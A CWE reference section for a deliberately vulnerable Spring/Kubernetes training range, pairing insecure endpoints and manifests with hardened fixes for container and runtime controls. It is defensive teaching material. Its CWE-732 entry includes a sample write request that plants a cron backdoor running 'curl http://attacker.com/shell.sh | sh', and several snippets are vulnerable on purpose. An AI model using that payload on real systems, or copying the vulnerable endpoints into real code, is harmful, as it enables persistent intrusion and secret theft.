# CWE Reference — §14 Runtime, Container and Kubernetes Hardening

CWEs extracted from `docs/14-runtime-hardening.md` with developer-focused comments.

> **Key premise of this module:** Nothing in `/vuln14` is a remote-code bug. The endpoints answer the question that follows every other module: **once an attacker has any request-level primitive inside this pod, what do they get?** This is the post-exploitation hardening layer — container, platform, and runtime controls that limit blast radius.

---

## CWE-200 — Information Exposure (Identity, Runtime, Topology Disclosure)

**Why it matters:** When an attacker already has a request into the application (via any vulnerability in previous modules), exposing identity, runtime environment, process coordinates, and service account layout gives them a complete map of the pod's internals. This enables lateral movement, privilege escalation, and targeted attacks against the Kubernetes infrastructure.

**Attack vector in Spring:**
```java
// VULNERABLE — identity, runtime and coordinates disclosed anonymously
@GetMapping("/context")
public ResponseEntity<?> context() {
    Map<String, Object> info = new LinkedHashMap<>();
    info.put("user", System.getProperty("user.name"));       // root
    info.put("uid", ProcessHandle.current().pid());          // process ID
    info.put("env", System.getenv());                        // ALL environment variables
    info.put("commandLine", ProcessHandle.current().info().commandLine().orElse(""));
    info.put("serviceAccountNamespace", getNamespace());     // Kubernetes namespace
    info.put("serviceAccountTokenMounted", isTokenMounted()); // true
    // Returns: full identity of the running process, all env vars, K8s namespace, SA token status
    return ResponseEntity.ok(info);
}

// VULNERABLE — credential-shaped variables returned with values
@GetMapping("/config-check")
public ResponseEntity<?> configCheck() {
    Map<String, String> result = new LinkedHashMap<>();
    for (Map.Entry<String, String> entry : System.getenv().entrySet()) {
        result.put(entry.getKey(), entry.getValue());  // DB_PASSWORD, API_KEY, etc.
    }
    return ResponseEntity.ok(result);
}
```
`GET /vuln14/context` returns the process user, UID, command line, all environment variables, and Kubernetes namespace. `GET /vuln14/config-check` returns all environment variables with values — including `DB_PASSWORD` if the pod was started with it.

**How to prevent:**
```java
// SAFE — report the shape, not the contents
@GetMapping("/hardening")
public ResponseEntity<?> hardening() {
    return ResponseEntity.ok(Map.of(
        "runsAsNonRoot", isNonRoot(),           // boolean
        "readOnlyRootFilesystem", isReadOnly(),  // boolean
        "serviceAccountTokenMounted", isTokenMounted(), // boolean
        "credentialShapedVariablesSeen", countCredentialVars(), // count, not values
        "credentialValuesReturned", 0           // never return values
    ));
}
```
- Return booleans and counts only — never values, never the manifest.
- The attacker can use the manifest as a target map; don't give them one.

---

## CWE-497 — Exposure of System Architecture to Unauthorized Actors

**Why it matters:** CWE-497 specifically covers exposure of the system's architectural layout — namespaces, service accounts, network topology, and pod relationships. In Kubernetes, this information reveals the multi-tenant structure, service mesh configuration, and inter-pod communication patterns. An attacker who knows the namespace layout can target other services in the same namespace.

**Attack vector in Spring:**
```java
// VULNERABLE — namespace and service account layout disclosed
@GetMapping("/context")
public ResponseEntity<?> context() {
    Map<String, Object> info = new LinkedHashMap<>();
    info.put("serviceAccountNamespace", getNamespace());  // "production"
    info.put("serviceAccountName", getServiceAccountName());  // "espd-service-sa"
    info.put("serviceAccountTokenMounted", isTokenMounted());  // true
    // Attacker learns: namespace, SA name, whether API token is mounted
    // Can target other services in the same namespace
}
```

**How to prevent:**
```java
// SAFE — boolean only, no names
@GetMapping("/hardening")
public ResponseEntity<?> hardening() {
    return ResponseEntity.ok(Map.of(
        "serviceAccountTokenMounted", isTokenMounted(),  // true/false only
        // No namespace name, no SA name
    ));
}
```
- `automountServiceAccountToken: false` in the deployment manifest.
- Where the API is needed, use a bound, audience-restricted token with per-resource RBAC — not `cluster-admin`.

---

## CWE-526 — Information Exposure Through Environment Variables (Credential Exposure in Container)

**Why it matters:** CWE-526 in the container context refers to credentials injected as environment variables into the pod spec. These are visible in the pod YAML, in `kubectl describe pod`, and through any endpoint that reads `System.getenv()`. In a containerized deployment, environment variables are the primary injection mechanism for secrets — compromising one endpoint compromises the entire deployment.

**Attack vector in Spring:**
```yaml
# VULNERABLE — credential as plain env in pod spec
spec:
  containers:
  - name: app
    env:
    - name: DB_PASSWORD
      value: "placeholder-not-a-real-credential"  # Visible in kubectl get pod -o yaml
    - name: API_KEY
      value: "AKIAIOSFODNN7EXAMPLE"
```
```java
// VULNERABLE — endpoint returns all env vars with values
@GetMapping("/config-check")
public ResponseEntity<?> configCheck() {
    return ResponseEntity.ok(System.getenv());  // DB_PASSWORD, API_KEY, etc.
}
```

**How to prevent:**
```yaml
# SAFE — secrets mounted read-only from secret provider
spec:
  containers:
  - name: app
    volumeMounts:
    - name: secret-volume
      mountPath: /mnt/config
      readOnly: true
  volumes:
  - name: secret-volume
    secret:
      secretName: espd-m14-config
      defaultMode: 0440  # read-only
```
- No credential material in the pod spec or the image.
- Values mounted read-only from Vault Agent injector at `/mnt/config`.
- The audit rejects `_PASSWORD|_TOKEN|_SECRET` in env variables.
- `Dockerfile.vulnerable`'s `ENV DB_PASSWORD` is a layer — no `rm` in a later `RUN` removes it.

---

## CWE-312 — Cleartext Storage of Sensitive Information (Credential in Container)

**Why it matters:** CWE-312 in the container context refers to credentials stored in cleartext in environment variables, Dockerfile layers, or pod specs. A credential in an `ENV` instruction becomes part of the image layer and is visible in `docker history` and `docker inspect`, even if a later layer deletes the file.

**Attack vector in Spring:**
```dockerfile
# VULNERABLE — credential in Dockerfile layer
FROM eclipse-temurin:21-jdk
ENV DB_PASSWORD=super-secret-123  # In image layer, visible in docker history
RUN rm /tmp/secret.txt  # Does NOT remove the ENV from the layer
```
The credential persists in the image layer even after "deletion" — it is visible in `docker history` and `docker inspect`.

**How to prevent:**
- Never put credentials in Dockerfiles.
- Mount secrets as read-only volumes from the secret provider.
- Use multi-stage builds so the toolchain never reaches the runtime layer.

---

## CWE-732 — Incorrect Permission Assignment for Critical Resource (Writable Filesystem)

**Why it matters:** A writable root filesystem in a container means that once an attacker has any file write primitive (e.g., `POST /vuln14/write`), they can persist malicious files on the container. This includes shell scripts, JSP shells, SSH keys, cron jobs, or systemd units — turning a temporary write into persistent access.

**Attack vector in Spring:**
```java
// VULNERABLE — any writable path is a persistence primitive
@PostMapping("/write")
public ResponseEntity<?> write(@RequestBody WriteRequest req) {
    Path target = Path.of(req.getPath());  // Attacker chooses any path
    Files.write(target, req.getContent().getBytes());
    // Attacker writes: /etc/cron.d/backdoor, /root/.ssh/authorized_keys, /tmp/shell.jsp
    return ResponseEntity.ok("written");
}
```
`POST /vuln14/write` with `{"path":"/etc/cron.d/backdoor","content":"* * * * * root curl http://attacker.com/shell.sh | sh"}` creates a cron job. The container's writable root filesystem allows persistence.

**How to prevent:**
```java
// SAFE — scoped to scratch directory only
private static final Path WRITABLE_ALLOW_LIST = Path.of("/tmp/vulnrange-m14").toAbsolutePath();

@PostMapping("/write")
public ResponseEntity<?> write(@RequestBody WriteRequest req) {
    Path target = Path.of(req.getPath()).toAbsolutePath().normalize();
    if (!target.startsWith(WRITABLE_ALLOW_LIST)) {
        return ResponseEntity.status(403).body("Path not allowed");
    }
    Files.write(target, req.getContent().getBytes());
    return ResponseEntity.ok("written");
}
```
```yaml
# SAFE — read-only root filesystem + tmpfs
spec:
  containers:
  - name: app
    securityContext:
      readOnlyRootFilesystem: true
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir:
      sizeLimit: 256Mi
```
- `readOnlyRootFilesystem: true` in the pod security context.
- tmpfs only where the service writes (`/tmp`, `sizeLimit: 256Mi`).
- Application allow-list for paths (`SafeRuntimeController.WRITABLE_ALLOW_LIST`).

---

## CWE-250 — Running with Unnecessary Privileges (Root Container)

**Why it matters:** CWE-250 covers two related issues: running the container process as root (CWE-250 root) and running privileged containers (CWE-250 privileged). A root process inside a container can escape to the host if the container is privileged, modify system files, install packages, or pivot to other containers on the same node. Running as root is the most common misconfiguration in Kubernetes deployments.

**Attack vector in Spring:**
```yaml
# VULNERABLE — runs as root
spec:
  containers:
  - name: app
    securityContext: {}  # Runs as root (UID 0) by default
    # Dockerfile: FROM eclipse-temurin:21-jdk  # No USER directive → root
```
```yaml
# VULNERABLE — privileged sidecar with host root mounted
spec:
  containers:
  - name: sidecar-debug
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /  # Host root filesystem!
```
A privileged container with `hostPath: /` mounted gives the attacker full access to the host node's filesystem. They can read `/etc/shadow`, modify other containers' data, install rootkits, and pivot to other workloads on the node.

**How to prevent:**
```yaml
# SAFE — non-root, no escalation, no privileges
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      privileged: false
      capabilities:
        drop: ["ALL"]
    # Dockerfile: USER 10001:10001
```
- `runAsNonRoot: true`, `runAsUser: 10001` at pod level.
- `allowPrivilegeEscalation: false`, `privileged: false`, `capabilities.drop: ["ALL"]`.
- `seccompProfile: RuntimeDefault`.
- In the image: `USER 10001:10001`.
- No privileged sidecars, no `hostPath` mounts.

---

## CWE-269 — Improper Privilege Management (Privileged Container)

**Why it matters:** CWE-269 in the container context refers to granting unnecessary privileges to containers. A privileged container has full access to the host's devices, kernel capabilities, and filesystem. A sidecar with `privileged: true` and `hostPath: /` is equivalent to giving the attacker root access to the entire node — not just the container.

**Attack vector in Spring:**
```yaml
# VULNERABLE — privileged sidecar
spec:
  containers:
  - name: sidecar-debug
    securityContext:
      privileged: true  # Full host access
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /  # Host root!
```
The `sidecar-debug` container can read `/host/etc/shadow`, write to `/host/etc/cron.d/`, and pivot to any other pod on the node.

**How to prevent:**
```yaml
# SAFE — no privilege escalation
spec:
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      privileged: false
      capabilities:
        drop: ["ALL"]
```
- `allowPrivilegeEscalation: false` prevents any process from gaining more privileges.
- `privileged: false` ensures the container does not have host access.
- `capabilities.drop: ["ALL"]` removes all Linux capabilities.
- The audit script rejects `privileged: true` and `hostPath:` in manifests.

---

## CWE-1104 — Use of Unmaintained or Vulnerable Third-Party Component (Mutable Image Tag)

**Why it matters:** CWE-1104 in the container context refers to using mutable image tags (`:latest`) in deployments. A `:latest` tag is not a fixed version — it changes whenever a new image is pushed to the registry. This means the deployment can silently pull a new build with new dependencies, new CVEs, or even malicious code. There is no way to answer which build is running, and rolling back is unreliable.

**Attack vector in Spring:**
```yaml
# VULNERABLE — mutable image tag
spec:
  containers:
  - name: app
    image: registry.example.org/espd/m14:latest  # Changes on every deploy
    imagePullPolicy: Always  # Always pulls the latest
```
`image: ...:latest` with `imagePullPolicy: Always` means the deployment pulls a new image on every pod restart. Nobody can answer which build is running. A new image push pulls new CVEs on every deploy.

**How to prevent:**
```yaml
# SAFE — image pinned by digest
spec:
  containers:
  - name: app
    image: registry.example.org/espd/m14@sha256:abc123...  # Immutable
```
- Pin by digest (`@sha256:`).
- Minimal base image (`21-jre-alpine`, distroless where available).
- No shell, no compiler, no package manager in the runtime image.
- Multi-stage build so the toolchain never reaches the runtime layer.
- SBOM and digest recorded in the deployment record.

---

## CWE-770 — Allocation of Resources Without Limits (No Workload Limits)

**Why it matters:** Without resource requests/limits, a single pod can consume all node resources (CPU, memory), causing other pods to starve. Without a PodDisruptionBudget, voluntary disruptions (node drains, rolling updates) can take down all replicas simultaneously, causing a complete outage.

**Attack vector in Spring:**
```yaml
# VULNERABLE — no workload limits
spec:
  replicas: 1  # Single replica, no PDB
  containers:
  - name: app
    # No resources.requests or resources.limits
    # A memory leak in the app → OOM → node fills up → other pods die
```
A single pod with no resource limits can exhaust the node. A single replica with no PDB means one disruption takes down the entire service.

**How to prevent:**
```yaml
# SAFE — resource limits + PDB
spec:
  replicas: 2
  containers:
  - name: app
    resources:
      requests:
        cpu: "250m"
        memory: "512Mi"
      limits:
        cpu: "500m"
        memory: "1Gi"
    # JVM flags:
    # -XX:MaxRAMPercentage=75.0
    # -XX:+ExitOnOutOfMemoryError
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: espd-pdb
spec:
  minAvailable: 1
  selector:
    matchLabels:
      app: espd
```
- `requests`/`limits` for CPU and memory.
- `PodDisruptionBudget` with `minAvailable: 1`.
- `-XX:MaxRAMPercentage` and `-XX:+ExitOnOutOfMemoryError` for JVM.

---

## CWE-923 — Improper Control of Communication Path Components (No Network Policy)

**Why it matters:** CWE-923 in the Kubernetes context refers to the absence of NetworkPolicy, which means every pod can reach every other pod. Without network segmentation, a compromised pod can reach the database, the metadata service, internal admin panels, and any other service on the cluster. Default-deny network policies are the firewall of the container plane.

**Attack vector in Spring:**
```yaml
# VULNERABLE — no NetworkPolicy
# Every pod can reach every pod
# Compromised pod can reach:
# - Database (port 5432)
# - Metadata service (169.254.169.254)
# - Internal admin panels
# - Any other service on the cluster
```
No `NetworkPolicy` means no network segmentation. A compromised pod in namespace `production` can reach the database in namespace `database`, the metadata service, and any other workload.

**How to prevent:**
```yaml
# SAFE — default-deny + explicit edges
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: espd-m14-default-deny
spec:
  podSelector: {}  # All pods
  policyTypes:
  - Ingress
  - Egress
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: espd-m14-allowed-edges
spec:
  podSelector:
    matchLabels:
      app: espd
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: gateway
    ports:
    - port: 8094
      protocol: TCP
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: database
    ports:
    - port: 5432
      protocol: TCP
  - to:
    - namespaceSelector: {}
    ports:
    - port: 53
      protocol: UDP  # DNS
```
- `espd-m14-default-deny` for ingress and egress.
- `espd-m14-allowed-edges` admitting only the gateway namespace and DNS.
- No metadata service, no arbitrary outbound 443.

---

## CWE-693 — Missing Defense in Depth (No Seccomp, No Probes)

**Why it matters:** CWE-693 in the container context refers to missing security controls that provide defense-in-depth. Without a seccomp profile, the container can use all Linux syscalls — including dangerous ones like `mount`, `reboot`, `kexec_load`. Without health probes, the orchestrator cannot detect when a pod is unhealthy, leading to traffic being sent to a dead process. Without a drain hook, rolling updates cause immediate connection drops.

**Attack vector in Spring:**
```yaml
# VULNERABLE — no seccomp, no probes, no drain hook
spec:
  containers:
  - name: app
    # No seccompProfile → can use any syscall
    # No startupProbe → pod marked ready before Spring context loads
    # No readinessProbe → traffic sent to unready pod
    # No livenessProbe → dead pod keeps receiving traffic
    # No preStop → rolling update kills pod immediately, no drain
```
Without seccomp, a compromised process can use `mount` to mount the host filesystem, `reboot` to crash the node, or `kexec_load` to load a new kernel. Without probes, the orchestrator sends traffic to a pod that is not ready or is dead.

**How to prevent:**
```yaml
# SAFE — seccomp + probes + drain
spec:
  seccompProfile:
    type: RuntimeDefault
  containers:
  - name: app
    startupProbe:
      httpGet:
        path: /actuator/health/liveness
        port: 8094
      failureThreshold: 30
      periodSeconds: 10
    readinessProbe:
      httpGet:
        path: /actuator/health/readiness
        port: 8094
    livenessProbe:
      httpGet:
        path: /actuator/health/liveness
        port: 8094
    lifecycle:
      preStop:
        exec:
          command: ["sleep", "10"]  # Graceful drain
```
- `seccompProfile: RuntimeDefault` blocks dangerous syscalls.
- Separate `startupProbe`/`readinessProbe`/`livenessProbe`.
- `preStop` sleep with `terminationGracePeriodSeconds` so a rollout drains.

---

## CWE-1104 — No Manifest Gate in CI (Mutable Image Tag / Missing Controls)

**Why it matters:** CWE-1104 in the CI/CD context refers to the absence of a manifest gate that enforces security controls at commit time. Without a gate, any developer can commit a vulnerable manifest (`privileged: true`, `hostPath: /`, `image: ...:latest`) and it passes CI. The gate is what prevents manifest regression — the manifest in git is an intention, the running object is the control, and the gate ensures they stay in sync.

**Attack vector in Spring:**
```yaml
# VULNERABLE — no manifest gate, vulnerable manifest is committable
# vulnerable-deployment.yaml contains:
#   - securityContext: {}  (runs as root)
#   - privileged: true
#   - hostPath: /
#   - image: ...:latest
#   - no NetworkPolicy
#   - no resource limits
#   - no seccompProfile
# All of these pass kubectl apply without a warning
```
The vulnerable manifest is committable and deployable. There is no CI gate that rejects it.

**How to prevent:**
```bash
# SAFE — manifest gate in CI
# scripts/check_k8s_manifests.sh
# Must contain: runAsNonRoot: true, allowPrivilegeEscalation: false,
#   readOnlyRootFilesystem: true, capabilities dropped, seccomp RuntimeDefault,
#   no API token mounted, resource limits, resource requests, PDB,
#   NetworkPolicy, image pinned by digest, readiness probe, drain hook
# Must NOT contain: mutable image tag, privileged containers, hostPath mounts,
#   host network, credential material in env
# Exits 1 on a missing control
```
- `scripts/check_k8s_manifests.sh` is a grep-based gate (no cluster, no `kubectl`).
- Called by `scripts/verify_range.sh` — fails the overall check if it fails.
- A Pod Security Standards profile (`restricted`) plus an admission policy prevents non-compliant pods from being scheduled at all.
- The manifest belongs in the same review as the code.
